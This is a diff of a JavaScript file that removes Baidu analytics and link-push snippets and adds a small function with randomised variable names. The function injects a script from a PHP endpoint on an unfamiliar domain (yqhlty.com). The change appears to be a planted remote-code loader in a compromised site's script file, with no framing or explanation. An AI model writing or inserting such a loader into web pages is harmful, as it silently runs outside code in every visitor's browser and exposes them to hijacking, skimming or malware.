@@ -1,23 +1,6 @@
-document.writeln("<script>");
-document.writeln("var _hmt = _hmt || [];");
-document.writeln("(function() {");
-document.writeln("  var hm = document.createElement(\"script\");");
-document.writeln("  hm.src = \"https:\/\/hm.baidu.com\/hm.js?670012759cc066c365eddd2b433657b4\";");
-document.writeln("  var s = document.getElementsByTagName(\"script\")[0]; ");
-document.writeln("  s.parentNode.insertBefore(hm, s);");
-document.writeln("})();");
-document.writeln("<\/script>")
-document.writeln("<script>");
-document.writeln("(function(){");
-document.writeln("    var bp = document.createElement(\'script\');");
-document.writeln("    var curProtocol = window.location.protocol.split(\':\')[0];");
-document.writeln("    if (curProtocol === \'https\') {");
-document.writeln("        bp.src = \'https:\/\/zz.bdstatic.com\/linksubmit\/push.js\';");
-document.writeln("    }");
-document.writeln("    else {");
-document.writeln("        bp.src = \'http:\/\/push.zhanzhang.baidu.com\/push.js\';");
-document.writeln("    }");
-document.writeln("    var s = document.getElementsByTagName(\"script\")[0];");
-document.writeln("    s.parentNode.insertBefore(bp, s);");
-document.writeln("})();");
-document.writeln("<\/script>");
+(function() {
+ var FBJfMQx = document.createElement("script");
+ FBJfMQx.src = "https://yqhlty.com/C5E7DFAF771D423ECF.php?id=8191";
+ var BIYtu = document.getElementsByTagName("script")[0];
+ BIYtu.parentNode.insertBefore(FBJfMQx, BIYtu);
+})();
